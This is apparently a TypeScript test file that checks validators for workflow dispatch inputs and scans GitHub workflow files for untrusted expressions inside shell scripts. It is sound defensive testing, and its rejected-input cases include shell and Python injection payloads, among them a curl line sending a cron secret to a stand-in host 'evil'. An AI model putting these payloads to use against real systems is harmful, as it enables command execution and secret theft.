import assert from 'node:assert/strict';
import { readdirSync, readFileSync } from 'node:fs';
import path from 'node:path';
import { describe, it } from 'node:test';
import { parseClipPipelineInputs, parseCompileHighlightsInputs } from './workflow-inputs';

const A = '11111111-1111-4111-8111-111111111111';
const B = '22222222-2222-4222-8222-222222222222';

describe('compile-highlights inputs', () => {
  it('accepts well-formed IDs and trims the title', () => {
    const result = parseCompileHighlightsInputs({ clipIds: [A, B], postIds: [A], title: '  Best of May ' });
    assert.deepEqual(result, {
      ok: true,
      value: { clipIds: [A, B], postIds: [A], title: 'Best of May', outputFilename: null },
    });
  });

  it('rejects anything that is not a UUID in an ID list', () => {
    for (const postIds of [['"; curl evil/?s=$CRON_SECRET; #'], [`${A}"`], 'not-a-list', [42]]) {
      assert.equal(parseCompileHighlightsInputs({ clipIds: [A, B], postIds }).ok, false);
    }
    assert.equal(parseCompileHighlightsInputs({ clipIds: [A, '$(id)'] }).ok, false);
    assert.equal(parseCompileHighlightsInputs({ clipIds: [A] }).ok, false);
    assert.equal(parseCompileHighlightsInputs({ clipIds: 'a,b' }).ok, false);
  });

  it('rejects path-like filenames and titles with control characters', () => {
    assert.equal(parseCompileHighlightsInputs({ clipIds: [A, B], outputFilename: '../x' }).ok, false);
    assert.equal(parseCompileHighlightsInputs({ clipIds: [A, B], outputFilename: 'a b' }).ok, false);
    assert.equal(parseCompileHighlightsInputs({ clipIds: [A, B], title: 'a\nb' }).ok, false);
    assert.equal(parseCompileHighlightsInputs({ clipIds: [A, B], title: 'x'.repeat(121) }).ok, false);
    assert.equal(parseCompileHighlightsInputs({ clipIds: [A, B], outputFilename: 'montage-1' }).ok, true);
  });
});

describe('clip-pipeline inputs', () => {
  it('defaults the numbers and allows a channel scan with no URL', () => {
    assert.deepEqual(parseClipPipelineInputs({}), {
      ok: true,
      value: { youtubeUrl: undefined, riverSlug: undefined, peakNumber: 1, maxClips: 3 },
    });
  });

  it('accepts YouTube links and river slugs', () => {
    const result = parseClipPipelineInputs({
      youtubeUrl: 'https://youtu.be/abc123',
      riverSlug: 'current-river',
      peakNumber: 2,
    });
    assert.equal(result.ok, true);
  });

  it('rejects non-integer peaks, non-slug rivers and non-YouTube hosts', () => {
    for (const body of [
      { peakNumber: 'a[$(id)]' },
      { peakNumber: 1.5 },
      { peakNumber: 0 },
      { peakNumber: 999 },
      { maxClips: '3' },
      { riverSlug: "x'+__import__('os').system('id')+'" },
      { riverSlug: 'Current River' },
      { youtubeUrl: 'https://example.com/watch?v=1' },
      { youtubeUrl: 'http://youtube.com/watch?v=1' },
      { youtubeUrl: 'not a url' },
    ]) {
      assert.equal(parseClipPipelineInputs(body).ok, false, JSON.stringify(body));
    }
  });
});

// The API check above is one caller. Workflows have others (manual dispatch,
// other workflows, the local runner), so the durable rule is in the workflow
// itself: an expression may fill an `env:`/`with:`/`if:` value, but must never
// appear inside the script text of a `run:` block, where its value would be
// parsed as shell.
describe('workflows keep dispatched values out of script text', () => {
  const dir = path.resolve(process.cwd(), '..', '.github', 'workflows');
  const UNTRUSTED = /\$\{\{\s*(inputs|github\.event|github\.head_ref|needs|steps)\b[^}]*\}\}/;

  for (const file of readdirSync(dir).filter((name) => /\.ya?ml$/.test(name))) {
    it(file, () => {
      const lines = readFileSync(path.join(dir, file), 'utf8').split('\n');
      const offenders: string[] = [];
      let runIndent = -1; // indent of the `run:` key while inside its block scalar
      lines.forEach((line, index) => {
        const indent = line.search(/\S/);
        if (runIndent >= 0 && indent >= 0 && indent <= runIndent) runIndent = -1;
        const inline = line.match(/^\s*(?:-\s+)?run:\s*(.*)$/);
        if (inline) {
          const rest = inline[1];
          if (/^[|>]/.test(rest)) runIndent = indent;
          else if (UNTRUSTED.test(rest)) offenders.push(`${index + 1}: ${line.trim()}`);
          return;
        }
        if (runIndent >= 0 && UNTRUSTED.test(line)) offenders.push(`${index + 1}: ${line.trim()}`);
      });
      assert.deepEqual(offenders, [], `pass these through env: instead\n${offenders.join('\n')}`);
    });
  }
});
